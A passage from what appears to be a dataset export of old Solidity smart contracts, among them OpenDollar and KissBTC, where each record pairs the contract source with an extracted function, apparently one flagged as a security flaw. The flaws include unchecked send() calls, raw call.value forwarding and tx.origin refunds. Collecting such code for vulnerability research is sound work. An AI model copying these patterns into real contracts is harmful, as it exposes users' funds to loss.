    "function ownerTakeProfit(bool takeChange) {\nif (owner != msg.sender) throw;\nif (takeChange){\nuint investorsCapital = 0;\nfor (uint i=1; i<=numInvestors; i++) {\ninvestorsCapital += investors[i].capital;\n}\nif ((investorsCapital == 0)&&(this.balance != uint(ownerProfit))){\nowner.send(this.balance);\nownerProfit = 0;\n}\n} else {\nowner.send(uint(ownerProfit));\nownerProfit = 0;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1640"
  },
  "filename": "40469.sol",
  "content": "contract EtherTreasuryInterface {\n function withdraw(address _to, uint _value) returns(bool);\n function withdrawWithReference(address _to, uint _value, string _reference) returns(bool);\n}\ncontract MultiAsset {\n function owner(bytes32 _symbol) constant returns(address);\n function isCreated(bytes32 _symbol) constant returns(bool);\n function totalSupply(bytes32 _symbol) constant returns(uint);\n function balanceOf(address _holder, bytes32 _symbol) constant returns(uint);\n function transfer(address _to, uint _value, bytes32 _symbol) returns(bool);\n function proxyTransferWithReference(address _to, uint _value, bytes32 _symbol, string _reference) returns(bool);\n function proxyTransferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool);\n function proxyApprove(address _spender, uint _value, bytes32 _symbol) returns(bool);\n function allowance(address _from, address _spender, bytes32 _symbol) constant returns(uint);\n function proxyTransferFromWithReference(address _from, address _to, uint _value, bytes32 _symbol, string _reference) returns(bool);\n function proxyTransferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) returns(bool);\n function proxySetCosignerAddress(address _address, bytes32 _symbol) returns(bool);\n}\ncontract Asset {\n event Transfer(address indexed from, address indexed to, uint value);\n event Approve(address indexed from, address indexed spender, uint value);\n MultiAsset public multiAsset;\n bytes32 public symbol;\n function init(address _multiAsset, bytes32 _symbol) returns(bool) {\n MultiAsset ma = MultiAsset(_multiAsset);\n if (address(multiAsset) != 0x0 || !ma.isCreated(_symbol)) {\n return false;\n }\n multiAsset = ma;\n symbol = _symbol;\n return true;\n }\n modifier onlyMultiAsset() {\n if (msg.sender == address(multiAsset)) {\n _\n }\n }\n function totalSupply() constant returns(uint) {\n return multiAsset.totalSupply(symbol);\n }\n function balanceOf(address _owner) constant returns(uint) {\n return multiAsset.balanceOf(_owner, symbol);\n }\n function allowance(address _from, address _spender) constant returns(uint) {\n return multiAsset.allowance(_from, _spender, symbol);\n }\n function transfer(address _to, uint _value) returns(bool) {\n return transferWithReference(_to, _value, \"\");\n }\n function transferWithReference(address _to, uint _value, string _reference) returns(bool) {\n if (!multiAsset.proxyTransferWithReference(_to, _value, symbol, _reference)) {\n return false;\n }\n return true;\n }\n function transferToICAP(bytes32 _icap, uint _value) returns(bool) {\n return transferToICAPWithReference(_icap, _value, \"\");\n }\n function transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool) {\n if (!multiAsset.proxyTransferToICAPWithReference(_icap, _value, _reference)) {\n return false;\n }\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns(bool) {\n return transferFromWithReference(_from, _to, _value, \"\");\n }\n function transferFromWithReference(address _from, address _to, uint _value, string _reference) returns(bool) {\n if (!multiAsset.proxyTransferFromWithReference(_from, _to, _value, symbol, _reference)) {\n return false;\n }\n return true;\n }\n function transferFromToICAP(address _from, bytes32 _icap, uint _value) returns(bool) {\n return transferFromToICAPWithReference(_from, _icap, _value, \"\");\n }\n function transferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) returns(bool) {\n if (!multiAsset.proxyTransferFromToICAPWithReference(_from, _icap, _value, _reference)) {\n return false;\n }\n return true;\n }\n function approve(address _spender, uint _value) returns(bool) {\n if (!multiAsset.proxyApprove(_spender, _value, symbol)) {\n return false;\n }\n return true;\n }\n function setCosignerAddress(address _cosigner) returns(bool) {\n if (!multiAsset.proxySetCosignerAddress(_cosigner, symbol)) {\n return false;\n }\n return true;\n }\n function emitTransfer(address _from, address _to, uint _value) onlyMultiAsset() {\n Transfer(_from, _to, _value);\n }\n function emitApprove(address _from, address _spender, uint _value) onlyMultiAsset() {\n Approve(_from, _spender, _value);\n }\n function sendToOwner() returns(bool) {\n return multiAsset.transfer(multiAsset.owner(symbol), balanceOf(address(this)), symbol);\n }\n}\ncontract Ambi {\n function getNodeAddress(bytes32) constant returns(address);\n function addNode(bytes32, address) external returns(bool);\n function hasRelation(bytes32, bytes32, address) constant returns(bool);\n}\ncontract AmbiEnabled {\n Ambi ambiC;\n bytes32 public name;\n modifier checkAccess(bytes32 _role) {\n if(address(ambiC) != 0x0 && ambiC.hasRelation(name, _role, msg.sender)){\n _\n }\n }\n function getAddress(bytes32 _name) constant returns (address) {\n return ambiC.getNodeAddress(_name);\n }\n function setAmbiAddress(address _ambi, bytes32 _name) returns (bool){\n if(address(ambiC) != 0x0){\n return false;\n }\n Ambi ambiContract = Ambi(_ambi);\n if(ambiContract.getNodeAddress(_name)!=address(this)) {\n bool isNode = ambiContract.addNode(_name, address(this));\n if (!isNode){\n return false;\n }\n }\n name = _name;\n ambiC = ambiContract;\n return true;\n }\n function remove() checkAccess(\"owner\") {\n suicide(msg.sender);\n }\n}\ncontract OpenDollar is Asset, AmbiEnabled {\n uint public txGasPriceLimit = 21000000000;\n uint public refundGas = 40000;\n uint public transferCallGas = 21000;\n uint public transferWithReferenceCallGas = 21000;\n uint public transferFromCallGas = 21000;\n uint public transferFromWithReferenceCallGas = 21000;\n uint public transferToICAPCallGas = 21000;\n uint public transferToICAPWithReferenceCallGas = 21000;\n uint public transferFromToICAPCallGas = 21000;\n uint public transferFromToICAPWithReferenceCallGas = 21000;\n uint public approveCallGas = 21000;\n uint public forwardCallGas = 21000;\n uint public setCosignerCallGas = 21000;\n EtherTreasuryInterface public treasury;\n mapping(uint32 => address) public allowedForwards;\n function updateRefundGas() checkAccess(\"setup\") returns(uint) {\n uint startGas = msg.gas;\n uint refund = (startGas - msg.gas + refundGas) * tx.gasprice;\n if (tx.gasprice > txGasPriceLimit) {\n return 0;\n }\n if (!_refund(1)) {\n return 0;\n }\n refundGas = startGas - msg.gas;\n return refundGas;\n }\n function setOperationsCallGas\n (\n uint _transfer,\n uint _transferFrom,\n uint _transferToICAP,\n uint _transferFromToICAP,\n uint _transferWithReference,\n uint _transferFromWithReference,\n uint _transferToICAPWithReference,\n uint _transferFromToICAPWithReference,\n uint _approve,\n uint _forward,\n uint _setCosigner\n ) checkAccess(\"setup\") returns(bool)\n {\n transferCallGas = _transfer;\n transferFromCallGas = _transferFrom;\n transferToICAPCallGas = _transferToICAP;\n transferFromToICAPCallGas = _transferFromToICAP;\n transferWithReferenceCallGas = _transferWithReference;\n transferFromWithReferenceCallGas = _transferFromWithReference;\n transferToICAPWithReferenceCallGas = _transferToICAPWithReference;\n transferFromToICAPWithReferenceCallGas = _transferFromToICAPWithReference;\n approveCallGas = _approve;\n forwardCallGas = _forward;\n setCosignerCallGas = _setCosigner;\n return true;\n }\n function setupTreasury(address _treasury, uint _txGasPriceLimit) checkAccess(\"admin\") returns(bool) {\n if (_txGasPriceLimit == 0) {\n return false;\n }\n treasury = EtherTreasuryInterface(_treasury);\n txGasPriceLimit = _txGasPriceLimit;\n if (msg.value > 0 && !address(treasury).send(msg.value)) {\n throw;\n }\n return true;\n }\n function setForward(bytes4 _msgSig, address _forward) checkAccess(\"admin\") returns(bool) {\n allowedForwards[uint32(_msgSig)] = _forward;\n return true;\n }\n function _stringGas(string _string) constant internal returns(uint) {\n return bytes(_string).length * 75;\n }\n function _applyRefund(uint _startGas) internal returns(bool) {\n if (tx.gasprice > txGasPriceLimit) {\n return false;\n }\n uint refund = (_startGas - msg.gas + refundGas) * tx.gasprice;\n return _refund(refund);\n }\n function _refund(uint _value) internal returns(bool) {\n return treasury.withdraw(tx.origin, _value);\n }\n function _transfer(address _to, uint _value) internal returns(bool, bool) {\n uint startGas = msg.gas + transferCallGas;\n if (!multiAsset.proxyTransferWithReference(_to, _value, symbol, \"\")) {\n return (false, false);\n }\n return (true, _applyRefund(startGas));\n }\n function _transferFrom(address _from, address _to, uint _value) internal returns(bool, bool) {\n uint startGas = msg.gas + transferFromCallGas;\n if (!multiAsset.proxyTransferFromWithReference(_from, _to, _value, symbol, \"\")) {\n return (false, false);\n }\n return (true, _applyRefund(startGas));\n }\n function _transferToICAP(bytes32 _icap, uint _value) internal returns(bool, bool) {\n uint startGas = msg.gas + transferToICAPCallGas;\n if (!multiAsset.proxyTransferToICAPWithReference(_icap, _value, \"\")) {\n return (false, false);\n }\n return (true, _applyRefund(startGas));\n }\n function _transferFromToICAP(address _from, bytes32 _icap, uint _value) internal returns(bool, bool) {\n uint startGas = msg.gas + transferFromToICAPCallGas;\n if (!multiAsset.proxyTransferFromToICAPWithReference(_from, _icap, _value, \"\")) {\n return (false, false);\n }\n return (true, _applyRefund(startGas));\n }\n function _transferWithReference(address _to, uint _value, string _reference) internal returns(bool, bool) {\n uint startGas = msg.gas + transferWithReferenceCallGas + _stringGas(_reference);\n if (!multiAsset.proxyTransferWithReference(_to, _value, symbol, _reference)) {\n return (false, false);\n }\n return (true, _applyRefund(startGas));\n }\n function _transferFromWithReference(address _from, address _to, uint _value, string _reference) internal returns(bool, bool) {\n uint startGas = msg.gas + transferFromWithReferenceCallGas + _stringGas(_reference);\n if (!multiAsset.proxyTransferFromWithReference(_from, _to, _value, symbol, _reference)) {\n return (false, false);\n }\n return (true, _applyRefund(startGas));\n }\n function _transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) internal returns(bool, bool) {\n uint startGas = msg.gas + transferToICAPWithReferenceCallGas + _stringGas(_reference);\n if (!multiAsset.proxyTransferToICAPWithReference(_icap, _value, _reference)) {\n return (false, false);\n }\n return (true, _applyRefund(startGas));\n }\n function _transferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) internal returns(bool, bool) {\n uint startGas = msg.gas + transferFromToICAPWithReferenceCallGas + _stringGas(_reference);\n if (!multiAsset.proxyTransferFromToICAPWithReference(_from, _icap, _value, _reference)) {\n return (false, false);\n }\n return (true, _applyRefund(startGas));\n }\n function _approve(address _spender, uint _value) internal returns(bool, bool) {\n uint startGas = msg.gas + approveCallGas;\n if (!multiAsset.proxyApprove(_spender, _value, symbol)) {\n return (false, false);\n }\n return (true, _applyRefund(startGas));\n }\n function _setCosignerAddress(address _cosigner) internal returns(bool, bool) {\n uint startGas = msg.gas + setCosignerCallGas;\n if (!multiAsset.proxySetCosignerAddress(_cosigner, symbol)) {\n return (false, false);\n }\n return (true, _applyRefund(startGas));\n }\n function transfer(address _to, uint _value) returns(bool) {\n bool success;\n (success,) = _transfer(_to, _value);\n return success;\n }\n function transferFrom(address _from, address _to, uint _value) returns(bool) {\n bool success;\n (success,) = _transferFrom(_from, _to, _value);\n return success;\n }\n function transferToICAP(bytes32 _icap, uint _value) returns(bool) {\n bool success;\n (success,) = _transferToICAP(_icap, _value);\n return success;\n }\n function transferFromToICAP(address _from, bytes32 _icap, uint _value) returns(bool) {\n bool success;\n (success,) = _transferFromToICAP(_from, _icap, _value);\n return success;\n }\n function transferWithReference(address _to, uint _value, string _reference) returns(bool) {\n bool success;\n (success,) = _transferWithReference(_to, _value, _reference);\n return success;\n }\n function transferFromWithReference(address _from, address _to, uint _value, string _reference) returns(bool) {\n bool success;\n (success,) = _transferFromWithReference(_from, _to, _value, _reference);\n return success;\n }\n function transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool) {\n bool success;\n (success,) = _transferToICAPWithReference(_icap, _value, _reference);\n return success;\n }\n function transferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) returns(bool) {\n bool success;\n (success,) = _transferFromToICAPWithReference(_from, _icap, _value, _reference);\n return success;\n }\n function approve(address _spender, uint _value) returns(bool) {\n bool success;\n (success,) = _approve(_spender, _value);\n return success;\n }\n function setCosignerAddress(address _cosigner) returns(bool) {\n bool success;\n (success,) = _setCosignerAddress(_cosigner);\n return success;\n }\n function checkTransfer(address _to, uint _value) constant returns(bool, bool) {\n return _transfer(_to, _value);\n }\n function checkTransferFrom(address _from, address _to, uint _value) constant returns(bool, bool) {\n return _transferFrom(_from, _to, _value);\n }\n function checkTransferToICAP(bytes32 _icap, uint _value) constant returns(bool, bool) {\n return _transferToICAP(_icap, _value);\n }\n function checkTransferFromToICAP(address _from, bytes32 _icap, uint _value) constant returns(bool, bool) {\n return _transferFromToICAP(_from, _icap, _value);\n }\n function checkTransferWithReference(address _to, uint _value, string _reference) constant returns(bool, bool) {\n return _transferWithReference(_to, _value, _reference);\n }\n function checkTransferFromWithReference(address _from, address _to, uint _value, string _reference) constant returns(bool, bool) {\n return _transferFromWithReference(_from, _to, _value, _reference);\n }\n function checkTransferToICAPWithReference(bytes32 _icap, uint _value, string _reference) constant returns(bool, bool) {\n return _transferToICAPWithReference(_icap, _value, _reference);\n }\n function checkTransferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) constant returns(bool, bool) {\n return _transferFromToICAPWithReference(_from, _icap, _value, _reference);\n }\n function checkApprove(address _spender, uint _value) constant returns(bool, bool) {\n return _approve(_spender, _value);\n }\n function checkSetCosignerAddress(address _cosigner) constant returns(bool, bool) {\n return _setCosignerAddress(_cosigner);\n }\n function _forward(address _to, bytes _data) internal returns(bool) {\n uint startGas = msg.gas + forwardCallGas + (_data.length * 50);\n if (_to == 0x0) {\n return false;\n }\n _to.call.value(msg.value)(_data);\n return _applyRefund(startGas);\n }\n function () returns(bool) {\n return _forward(allowedForwards[uint32(msg.sig)], msg.data);\n }\n}",
  "extract_feature": [
    "function setupTreasury(address _treasury, uint _txGasPriceLimit) checkAccess(\"admin\") returns(bool) {\nif (_txGasPriceLimit == 0) {\nreturn false;\n}\ntreasury = EtherTreasuryInterface(_treasury);\ntxGasPriceLimit = _txGasPriceLimit;\nif (msg.value > 0 && !address(treasury).send(msg.value)) {\nthrow;\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1641"
  },
  "filename": "40481.sol",
  "content": "contract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n address oraclizeAddr = OAR.getAddress();\n if (oraclizeAddr == 0){\n oraclize_setNetwork(networkID_auto);\n oraclizeAddr = OAR.getAddress();\n }\n oraclize = OraclizeI(oraclizeAddr);\n _\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed);\n return true;\n }\n if (getCodeSize(0x9efbea6358bed926b293d2ce63a730d6d98d43dd)>0){\n OAR = OraclizeAddrResolverI(0x9efbea6358bed926b293d2ce63a730d6d98d43dd);\n return true;\n }\n if (getCodeSize(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf)>0){\n OAR = OraclizeAddrResolverI(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf);\n return true;\n }\n return false;\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int)\n {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string){\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n mint *= 10 ** _b;\n return mint;\n }\n}\ncontract TokenInterface {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _amount) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _amount) returns (bool success);\n function approve(address _spender, uint256 _amount) returns (bool success);\n function allowance(\n address _owner,\n address _spender\n ) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _amount\n );\n}\ncontract Token is TokenInterface {\n modifier noEther() {if (msg.value > 0) throw; _}\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function _transfer(address _to, uint256 _amount) internal returns (bool success) {\n if (balances[msg.sender] >= _amount && _amount > 0) {\n balances[msg.sender] -= _amount;\n balances[_to] += _amount;\n Transfer(msg.sender, _to, _amount);\n return true;\n } else {\n return false;\n }\n }\n function _transferFrom(\n address _from,\n address _to,\n uint256 _amount\n ) internal returns (bool success) {\n if (balances[_from] >= _amount\n && allowed[_from][msg.sender] >= _amount\n && _amount > 0) {\n balances[_to] += _amount;\n balances[_from] -= _amount;\n allowed[_from][msg.sender] -= _amount;\n Transfer(_from, _to, _amount);\n return true;\n } else {\n return false;\n }\n }\n function approve(address _spender, uint256 _amount) returns (bool success) {\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract KissBTCCallback {\n function kissBTCCallback(uint id, uint amount);\n}\ncontract ApprovalRecipient {\n function receiveApproval(address _from, uint256 _amount,\n address _tokenContract, bytes _extraData);\n}\ncontract KissBTC is usingOraclize, Token {\n string constant PRICE_FEED =\n \"json(https:\n uint constant MAX_AMOUNT =\n 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n uint constant MAX_ETH_VALUE = 10 ether;\n uint constant MIN_ETH_VALUE = 50 finney;\n uint constant MAX_KISS_BTC_VALUE = 25000000;\n uint constant MIN_KISS_BTC_VALUE = 125000;\n uint constant DEFAULT_GAS_LIMIT = 200000;\n string public standard = \"Token 0.1\";\n string public name = \"kissBTC\";\n string public symbol = \"kissBTC\";\n uint8 public decimals = 8;\n struct Task {\n bytes32 oraclizeId;\n bool toKissBTC;\n address sender;\n uint value;\n address callback;\n uint timestamp;\n }\n mapping (uint => Task) public tasks;\n mapping (bytes32 => uint) public oraclizeRequests;\n uint public exchangeRate;\n uint public nextId = 1;\n address public owner;\n uint public timestamp;\n modifier onlyowner { if (msg.sender == owner) _ }\n function KissBTC() {\n owner = msg.sender;\n }\n function () {\n buyKissBTCWithCallback(0, DEFAULT_GAS_LIMIT);\n }\n function buyKissBTC() {\n buyKissBTCWithCallback(0, DEFAULT_GAS_LIMIT);\n }\n function buyKissBTCWithCallback(address callback,\n uint gasLimit) oraclizeAPI\n returns (uint id) {\n if (msg.value < MIN_ETH_VALUE || msg.value > MAX_ETH_VALUE) throw;\n if (gasLimit < DEFAULT_GAS_LIMIT) gasLimit = DEFAULT_GAS_LIMIT;\n uint oraclizePrice = oraclize.getPrice(\"URL\", gasLimit);\n uint fee = msg.value / 100;\n if (msg.value <= oraclizePrice + fee) throw;\n uint value = msg.value - (oraclizePrice + fee);\n id = nextId++;\n bytes32 oraclizeId = oraclize.query_withGasLimit.value(oraclizePrice)(\n 0,\n \"URL\",\n PRICE_FEED,\n gasLimit\n );\n tasks[id].oraclizeId = oraclizeId;\n tasks[id].toKissBTC = true;\n tasks[id].sender = msg.sender;\n tasks[id].value = value;\n tasks[id].callback = callback;\n tasks[id].timestamp = now;\n oraclizeRequests[oraclizeId] = id;\n }\n function transfer(address _to,\n uint256 _amount) noEther returns (bool success) {\n if (_to == address(this)) {\n sellKissBTCWithCallback(_amount, 0, DEFAULT_GAS_LIMIT);\n return true;\n } else {\n return _transfer(_to, _amount);\n }\n }\n function transferFrom(address _from,\n address _to,\n uint256 _amount) noEther returns (bool success) {\n if (_to == address(this)) throw;\n return _transferFrom(_from, _to, _amount);\n }\n function sellKissBTC(uint256 _amount) returns (uint id) {\n return sellKissBTCWithCallback(_amount, 0, DEFAULT_GAS_LIMIT);\n }\n function sellKissBTCWithCallback(uint256 _amount,\n address callback,\n uint gasLimit) oraclizeAPI\n returns (uint id) {\n if (_amount < MIN_KISS_BTC_VALUE\n || _amount > MAX_KISS_BTC_VALUE) throw;\n if (balances[msg.sender] < _amount) throw;\n if (gasLimit < DEFAULT_GAS_LIMIT) gasLimit = DEFAULT_GAS_LIMIT;\n if (!safeToSell(_amount)) throw;\n uint oraclizePrice = oraclize.getPrice(\"URL\", gasLimit);\n uint oraclizePriceKissBTC = inKissBTC(oraclizePrice);\n uint fee = _amount / 100;\n if (_amount <= oraclizePriceKissBTC + fee) throw;\n uint value = _amount - (oraclizePriceKissBTC + fee);\n balances[msg.sender] -= _amount;\n totalSupply -= _amount;\n Transfer(msg.sender, address(this), _amount);\n id = nextId++;\n bytes32 oraclizeId = oraclize.query_withGasLimit.value(oraclizePrice)(\n 0,\n \"URL\",\n PRICE_FEED,\n gasLimit\n );\n tasks[id].oraclizeId = oraclizeId;\n tasks[id].toKissBTC = false;\n tasks[id].sender = msg.sender;\n tasks[id].value = value;\n tasks[id].callback = callback;\n tasks[id].timestamp = now;\n oraclizeRequests[oraclizeId] = id;\n }\n function inKissBTC(uint amount) constant returns (uint) {\n return (amount * exchangeRate) / 1000000000000000000;\n }\n function inEther(uint amount) constant returns (uint) {\n return (amount * 1000000000000000000) / exchangeRate;\n }\n function safeToSell(uint amount) constant returns (bool) {\n return inEther(amount) * 125 < this.balance * 100;\n }\n function __callback(bytes32 oraclizeId, string result) {\n if (msg.sender != oraclize_cbAddress()) throw;\n uint _exchangeRate = parseInt(result, 6) * 100;\n if (_exchangeRate > 0) {\n exchangeRate = _exchangeRate;\n }\n uint id = oraclizeRequests[oraclizeId];\n if (id == 0) return;\n address sender = tasks[id].sender;\n address callback = tasks[id].callback;\n if (tasks[id].toKissBTC) {\n uint freshKissBTC = inKissBTC(tasks[id].value);\n totalSupply += freshKissBTC;\n balances[sender] += freshKissBTC;\n Transfer(address(this), sender, freshKissBTC);\n if (callback != 0) {\n KissBTCCallback(callback).kissBTCCallback.\n value(0)(id, freshKissBTC);\n }\n } else {\n uint releasedEther = inEther(tasks[id].value);\n sender.send(releasedEther);\n if (callback != 0) {\n KissBTCCallback(callback).kissBTCCallback.\n value(0)(id, releasedEther);\n }\n }\n delete oraclizeRequests[oraclizeId];\n delete tasks[id];\n }\n function retryOraclizeRequest(uint id) oraclizeAPI {\n if (tasks[id].oraclizeId == 0) throw;\n uint timePassed = now - tasks[id].timestamp;\n if (timePassed < 60 minutes) throw;\n uint price = oraclize.getPrice(\"URL\", DEFAULT_GAS_LIMIT);\n bytes32 newOraclizeId = oraclize.query_withGasLimit.value(price)(\n 0,\n \"URL\",\n PRICE_FEED,\n DEFAULT_GAS_LIMIT\n );\n delete oraclizeRequests[tasks[id].oraclizeId];\n tasks[id].oraclizeId = newOraclizeId;\n tasks[id].callback = 0;\n tasks[id].timestamp = now;\n oraclizeRequests[newOraclizeId] = id;\n }\n function whitelist(address _spender) returns (bool success) {\n return approve(_spender, MAX_AMOUNT);\n }\n function approveAndCall(address _spender,\n uint256 _amount,\n bytes _extraData) returns (bool success) {\n approve(_spender, _amount);\n ApprovalRecipient(_spender).receiveApproval.\n value(0)(msg.sender, _amount, this, _extraData);\n return true;\n }\n function donate() {\n }\n function toldYouItWouldWork() onlyowner {\n if (now - timestamp < 24 hours) throw;\n uint obligations = inEther(totalSupply);\n if (this.balance <= obligations * 3) throw;\n uint excess = this.balance - (obligations * 3);\n uint payment = excess / 100;\n if (payment > 0) owner.send(payment);\n timestamp 